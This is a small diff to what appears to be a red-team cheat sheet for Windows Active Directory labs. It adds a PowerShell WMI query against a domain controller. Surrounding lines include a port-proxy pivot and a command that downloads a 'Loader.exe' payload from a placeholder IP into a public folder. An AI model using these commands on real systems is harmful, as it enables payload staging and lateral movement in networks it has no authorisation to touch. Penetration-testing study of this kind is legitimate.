@@ -118,6 +118,11 @@ C:> netsh interface portproxy add v4tov4 listenport=<local_port> listenaddress=<
 # From a URL to a file
 C:> iwr http://<IP>/Loader.exe -OutFile C:\Users\Public\Loader.exe
 ```
+### Run WMI Commands
+---
+```powershell
+C:> gwmi -Class win32_computersystem -ComputerName dcorp-dc
+```
 ### BloodHound
 ---
 
